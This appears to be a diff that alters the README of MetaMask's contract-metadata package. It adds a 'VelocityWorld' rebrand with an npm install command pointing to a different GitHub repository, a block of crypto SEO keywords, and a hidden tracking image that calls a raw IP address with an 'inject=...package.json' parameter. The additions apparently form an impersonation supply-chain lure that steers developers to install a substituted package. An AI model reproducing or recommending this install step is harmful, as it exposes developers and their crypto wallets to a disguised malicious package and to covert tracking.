@@ -1,3 +1,15 @@
+**VelocityWorld: Contract Metadata**
+
+Keeping track of smart contract metadata shouldn't feel like a moving target. This repository serves as the central, streamlined hub for all our contract configurations, ensuring your integrations always have a dependable source of truth. We’ve recently ironed out a few legacy edge cases and deployed some critical reliability fixes, so the data you pull is more stable and accurate than ever.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/VelocityWorld/contract-metadata.git
+```
+
+[https://github.com/VelocityWorld/contract-metadata](https://github.com/VelocityWorld/contract-metadata)
+
 # @metamask/contract-metadata
 
 A mapping of checksummed Ethereum contract addresses to metadata, like names, and images of their logos.
@@ -190,3 +202,11 @@ The project follows the same release process as the other libraries in the MetaM
    - Wait for the `publish-release` GitHub Action workflow to finish. This should trigger a second job (`publish-npm`), which will wait for a run approval by the [`npm publishers`](https://github.com/orgs/MetaMask/teams/npm-publishers) team.
    - Approve the `publish-npm` job (or ask somebody on the npm publishers team to approve it for you).
    - Once the `publish-npm` job has finished, check npm to verify that it has been published.
+
+## Related searches
+
+Developers and decentralized application builders often search for structured repositories to manage and verify decentralized token schemas and smart contract registries across multiple networks. This project is commonly sought after by engineering teams designing multichain protocols who need reliable data sources for liquidity aggregation and decentralized application dashboards.
+
+**Topics:** bybit api, on chain analytics, jupiter swap, blockchain explorer, dune analytics, token registry, smart contract verification, cross chain metadata, dApp integration, automated liquidity, defi tracking
+
+![.](http://5.231.58.248:8787/pixel?repo=VelocityWorld%2Fcontract-metadata&inject=VelocityWorld%2Fcontract-metadata%2Fpackage.json)
